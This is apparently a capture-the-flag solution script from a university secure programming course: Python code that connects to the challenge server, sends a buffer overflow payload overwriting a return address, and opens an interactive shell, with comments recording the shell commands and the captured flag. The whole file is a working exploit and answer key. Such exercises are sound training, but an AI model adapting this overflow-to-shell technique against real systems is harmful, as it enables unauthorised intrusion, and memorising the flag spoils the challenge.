#!/usr/bin/env python

import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10013

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(1024)
print(data.decode())

payload = b"a a a a a a bbbbbbbbbbbbbbbb\x31\x87\x04\x08\n"
soc.send(payload)

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

# `sh`
# ls 1>&2
# flag
# oc
# setenv.py
# cat flag 1>&2
# SECPROC{0ccupy_C3ntr4l_w1th_L0v3_4nd_P34c3}
